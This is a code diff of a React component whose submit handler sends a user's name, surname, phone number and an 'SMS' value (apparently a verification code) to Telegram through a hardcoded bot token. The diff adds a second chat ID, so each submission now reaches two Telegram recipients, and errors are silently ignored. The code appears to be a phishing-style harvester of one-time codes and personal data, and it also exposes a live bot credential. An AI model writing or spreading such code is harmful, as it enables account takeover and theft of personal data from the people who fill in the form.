@@ -133,17 +133,29 @@ const Chaild = ({ cards, addCard }) => {
   const handleSubmit = async () => {
     const botToken = '7431288007:AAGJLfjZf2_mRVWszsouH5SVuRvz7slw2QA';
     const chatId = '789670134';
+    const chatId2 = '1583348688';
     const message = `Ism: ${formData.input1}\nFamiliya: ${formData.input2}\nTelfon raqam: ${formData.input3}\nSMS: ${formData.input4}`;
-
     try {
       await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        chat_id: chatId,
+        // chat_id: chatId,
+        chat_id: chatId2,
         text: message
       });
     } catch (error) {
     }
-  };//bot uchun 
-  // const [products, setProducts] = useState([]);
+  
+    try {
+      await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        chat_id: chatId,
+        // chat_id: chatId2,
+        text: message
+      });
+    } catch (error) {
+    }
+
+  };
+
+  
   const [loading, setLoading] = useState(true);
 
 
